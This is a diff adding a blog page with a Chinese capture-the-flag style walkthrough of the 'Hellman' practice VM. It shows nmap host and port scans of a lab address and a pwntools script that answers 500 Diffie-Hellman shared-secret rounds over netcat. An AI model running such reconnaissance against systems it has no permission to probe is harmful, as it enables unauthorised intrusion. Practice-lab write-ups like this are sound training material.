@@ -1,0 +1,829 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机来源：QQ群-660930334 难度：Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mazesec_Hellman">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Mazesec-Hellman/index.html">
+<meta property="og:site_name" content="Miao Blog">
+<meta property="og:description" content="靶机来源：QQ群-660930334 难度：Easy">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601271725140.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601281607516.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601281812299.png">
+<meta property="article:published_time" content="2026-01-27T03:34:33.000Z">
+<meta property="article:modified_time" content="2026-03-11T03:37:22.194Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="汇编">
+<meta property="article:tag" content="Diffie-Hellman">
+<meta property="article:tag" content="XOR">
+<meta property="article:tag" content="提取-incus组">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601271725140.png">
+  
+  
+  
+  <title>Mazesec_Hellman - Miao Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":"flase"},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mazesec_Hellman"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-27 11:34" pubdate>
+          2026年1月27日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mazesec_Hellman</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>靶机来源：QQ群-<code>660930334</code></p>
+<p>难度：Easy</p>
+<span id="more"></span>
+
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 13:01 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00057s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00067s latency).<br>MAC Address: 08:00:27:71:57:99 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.60<br>Host is up (0.00094s latency).<br>MAC Address: 08:00:27:F2:61:32 (Oracle VirtualBox virtual NIC)<br>Stats: 0:00:07 elapsed; 255 hosts completed (3 up), 255 undergoing Host Discovery<br>Parallel DNS resolution of 1 host. Timing: About 0.00% <span class="hljs-keyword">done</span><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 7.51 seconds<br></code></pre></td></tr></table></figure>
+
+<p>靶机IP：<code>192.168.2.60</code></p>
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.60                   <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 13:02 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.60<br>Host is up (0.00063s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>1337/tcp open  waste<br>MAC Address: 08:00:27:F2:61:32 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.50 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口：<code>22、80、1337</code></p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sC -sV -O -p22,80,1337 192.168.2.60<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 13:02 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.60<br>Host is up (0.0017s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)<br>80/tcp   open  http    nginx<br>|_http-title: Diffie-Hellman Challenge Guide<br>1337/tcp open  waste?<br>| fingerprint-strings: <br>|   GenericLines, NULL: <br>|     Alice has sent you her public key.<br>|     You<span class="hljs-string">&#x27;ve also been given your private key.</span><br><span class="hljs-string">|     calculate your shared secret.</span><br><span class="hljs-string">|     2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919</span><br><span class="hljs-string">|     39883204222858856918557640435344745890513425125290039851563654356835662268498</span><br><span class="hljs-string">|     224638392781010346795674419563132197430625052467062663656728020806452536513319721055074207335278925919928267028716364525781824472324432672098280141614523807650997041044044996580695734531375627561478894572919232085682056248754553</span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     Alice has sent you her public key.</span><br><span class="hljs-string">|     You&#x27;</span>ve also been given your private key.<br>|     calculate your shared secret.<br>|     2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919<br>|     30659261933364259369132068323793156534865584845264382299796372358262839566253<br>|_    141857959155456004789209623147729647056961948062733887997137635919822708590999302708538583075539897493266262709687118908656475132467268775267767813200521394686273807598087086012147629209008628488571390034369609577109391080455020<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port1337-TCP:V=7.98%I=7%D=1/27%Time=697846F4%P=x86_64-pc-linux-gnu%r(NU<br>SF:LL,473,<span class="hljs-string">&quot;Alice\x20has\x20sent\x20you\x20her\x20public\x20key\.\nYou&#x27;ve\x</span><br><span class="hljs-string">SF:20also\x20been\x20given\x20your\x20private\x20key\.\nNow\x20calculate\x</span><br><span class="hljs-string">SF:20your\x20shared\x20secret\.\n\ng\x20=\x202\np\x20=\x202410312426921032</span><br><span class="hljs-string">SF:58855207602219756607485695054850245994265411694195810883168261222889009</span><br><span class="hljs-string">SF:38582613416146732271414779040121965036489570505826319427307068050092230</span><br><span class="hljs-string">SF:62734745341073406696246014589361659774041027169249453200378729434170325</span><br><span class="hljs-string">SF:84377865919814376319377685986952408894019557734611984354530154704374720</span><br><span class="hljs-string">SF:77499697637500843089263392955599688824578724129938101291302945929999479</span><br><span class="hljs-string">SF:26365264059284647209730384947211681434464714438488520940127459844288859</span><br><span class="hljs-string">SF:336526896320919633919\n\nb\x20=\x20398832042228588569185576404353447458</span><br><span class="hljs-string">SF:90513425125290039851563654356835662268498\nA\x20=\x20224638392781010346</span><br><span class="hljs-string">SF:79567441956313219743062505246706266365672802080645253651331972105507420</span><br><span class="hljs-string">SF:73352789259199282670287163645257818244723244326720982801416145238076509</span><br><span class="hljs-string">SF:97041044044996580695734531375627561478894572919232085682056248754553&quot;</span>)%<br>SF:r(GenericLines,482,<span class="hljs-string">&quot;Alice\x20has\x20sent\x20you\x20her\x20public\x20key</span><br><span class="hljs-string">SF:\.\nYou&#x27;ve\x20also\x20been\x20given\x20your\x20private\x20key\.\nNow\x2</span><br><span class="hljs-string">SF:0calculate\x20your\x20shared\x20secret\.\n\ng\x20=\x202\np\x20=\x202410</span><br><span class="hljs-string">SF:31242692103258855207602219756607485695054850245994265411694195810883168</span><br><span class="hljs-string">SF:26122288900938582613416146732271414779040121965036489570505826319427307</span><br><span class="hljs-string">SF:06805009223062734745341073406696246014589361659774041027169249453200378</span><br><span class="hljs-string">SF:72943417032584377865919814376319377685986952408894019557734611984354530</span><br><span class="hljs-string">SF:15470437472077499697637500843089263392955599688824578724129938101291302</span><br><span class="hljs-string">SF:94592999947926365264059284647209730384947211681434464714438488520940127</span><br><span class="hljs-string">SF:459844288859336526896320919633919\n\nb\x20=\x20398832042228588569185576</span><br><span class="hljs-string">SF:40435344745890513425125290039851563654356835662268498\nA\x20=\x20224638</span><br><span class="hljs-string">SF:39278101034679567441956313219743062505246706266365672802080645253651331</span><br><span class="hljs-string">SF:97210550742073352789259199282670287163645257818244723244326720982801416</span><br><span class="hljs-string">SF:14523807650997041044044996580695734531375627561478894572919232085682056</span><br><span class="hljs-string">SF:248754553&quot;</span>)%r(GetRequest,482,<span class="hljs-string">&quot;Alice\x20has\x20sent\x20you\x20her\x20pub</span><br><span class="hljs-string">SF:lic\x20key\.\nYou&#x27;ve\x20also\x20been\x20given\x20your\x20private\x20key</span><br><span class="hljs-string">SF:\.\nNow\x20calculate\x20your\x20shared\x20secret\.\n\ng\x20=\x202\np\x2</span><br><span class="hljs-string">SF:0=\x2024103124269210325885520760221975660748569505485024599426541169419</span><br><span class="hljs-string">SF:58108831682612228890093858261341614673227141477904012196503648957050582</span><br><span class="hljs-string">SF:63194273070680500922306273474534107340669624601458936165977404102716924</span><br><span class="hljs-string">SF:94532003787294341703258437786591981437631937768598695240889401955773461</span><br><span class="hljs-string">SF:19843545301547043747207749969763750084308926339295559968882457872412993</span><br><span class="hljs-string">SF:81012913029459299994792636526405928464720973038494721168143446471443848</span><br><span class="hljs-string">SF:8520940127459844288859336526896320919633919\n\nb\x20=\x2030659261933364</span><br><span class="hljs-string">SF:259369132068323793156534865584845264382299796372358262839566253\nA\x20=</span><br><span class="hljs-string">SF:\x201418579591554560047892096231477296470569619480627338879971376359198</span><br><span class="hljs-string">SF:22708590999302708538583075539897493266262709687118908656475132467268775</span><br><span class="hljs-string">SF:26776781320052139468627380759808708601214762920900862848857139003436960</span><br><span class="hljs-string">SF:9577109391080455020&quot;</span>);<br>MAC Address: 08:00:27:F2:61:32 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 93.52 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601271725140.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"> 提示我们是一个<code>Diffie-Hellman Key Exchange</code>，需要交换500次，使用自动化脚本进行，访问<code>nc hellman.dsz 1337</code></p>
+<h1 id="三、Diffie-Hellman"><a href="#三、Diffie-Hellman" class="headerlink" title="三、Diffie-Hellman"></a>三、Diffie-Hellman</h1><p>使用<code>nc</code>访问1337端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nc 192.168.2.60 1337                                          <br>Alice has sent you her public key.<br>You<span class="hljs-string">&#x27;ve also been given your private key.</span><br><span class="hljs-string">Now calculate your shared secret.</span><br><span class="hljs-string"></span><br><span class="hljs-string">g = 2</span><br><span class="hljs-string">p = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919</span><br><span class="hljs-string"></span><br><span class="hljs-string">b = 51154570168425237012190187261208452554935228966342909476175478257010034448854</span><br><span class="hljs-string">A = 1810096577306243736581942011207190129532077359040013432015086489684205815534398460549275846332291790537384649787817466650218512598949970197232507513372720069383980178553518222604140035165806150793414342893343137096664748831497856441434056477271196223931376386008074303053540618281394821915277589825901885193302437264716584784840559143099754318836327577637969351350571153233730788109044478376649815836540623348562572608183613314000872264170553433293147256838513298</span><br><span class="hljs-string"> &gt; </span><br></code></pre></td></tr></table></figure>
+
+<p>需要计算出共享钥，经过测试发现，第二轮之后只有<code>b和A</code>变了，使用AI写一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>HOST = <span class="hljs-string">&quot;192.168.2.60&quot;</span><br>PORT = <span class="hljs-number">1337</span><br>context.timeout = <span class="hljs-number">10</span><br><br>io = remote(HOST, PORT)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_round1</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;读取第1轮：需要 p, b, A&quot;&quot;&quot;</span><br>    p = b = A = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">while</span> p <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> b <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> A <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        line = io.recvline().decode().strip()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[R1] <span class="hljs-subst">&#123;<span class="hljs-built_in">repr</span>(line)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;p = &quot;</span>):<br>            p = <span class="hljs-built_in">int</span>(line.split(<span class="hljs-string">&quot;= &quot;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">elif</span> line.startswith(<span class="hljs-string">&quot;b = &quot;</span>):<br>            b = <span class="hljs-built_in">int</span>(line.split(<span class="hljs-string">&quot;= &quot;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">elif</span> line.startswith(<span class="hljs-string">&quot;A = &quot;</span>):<br>            A = <span class="hljs-built_in">int</span>(line.split(<span class="hljs-string">&quot;= &quot;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> p, b, A<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_next_round</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;读取第2+轮：只需要 b, A&quot;&quot;&quot;</span><br>    b = A = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">while</span> b <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> A <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        line = io.recvline().decode().strip()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[RN] <span class="hljs-subst">&#123;<span class="hljs-built_in">repr</span>(line)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;b = &quot;</span>):<br>            b = <span class="hljs-built_in">int</span>(line.split(<span class="hljs-string">&quot;= &quot;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">elif</span> line.startswith(<span class="hljs-string">&quot;A = &quot;</span>):<br>            A = <span class="hljs-built_in">int</span>(line.split(<span class="hljs-string">&quot;= &quot;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>])<br>        <span class="hljs-comment"># 忽略其他行（包括空行、&#x27;&gt; Correct!&#x27; 等）</span><br>    <span class="hljs-keyword">return</span> b, A<br><br><span class="hljs-comment"># ===== Round 1 =====</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Round 1&quot;</span>)<br>p, b, A = read_round1()<br>S = <span class="hljs-built_in">pow</span>(A, b, p)<br>io.sendline(<span class="hljs-built_in">str</span>(S).encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Round 1 done\n&quot;</span>)<br><br><span class="hljs-comment"># ===== Rounds 2–500 =====</span><br><span class="hljs-keyword">for</span> round_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">501</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Round <span class="hljs-subst">&#123;round_num&#125;</span>&quot;</span>)<br>    b, A = read_next_round()<br>    S = <span class="hljs-built_in">pow</span>(A, b, p)<br>    io.sendline(<span class="hljs-built_in">str</span>(S).encode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Round <span class="hljs-subst">&#123;round_num&#125;</span> done&quot;</span>)<br><br><span class="hljs-comment"># ===== Flag =====</span><br>flag = io.recvall(timeout=<span class="hljs-number">5</span>).decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n🎉 FLAG:&quot;</span>)<br><span class="hljs-built_in">print</span>(flag)<br>io.close()<br></code></pre></td></tr></table></figure>
+
+<p>成功执行</p>
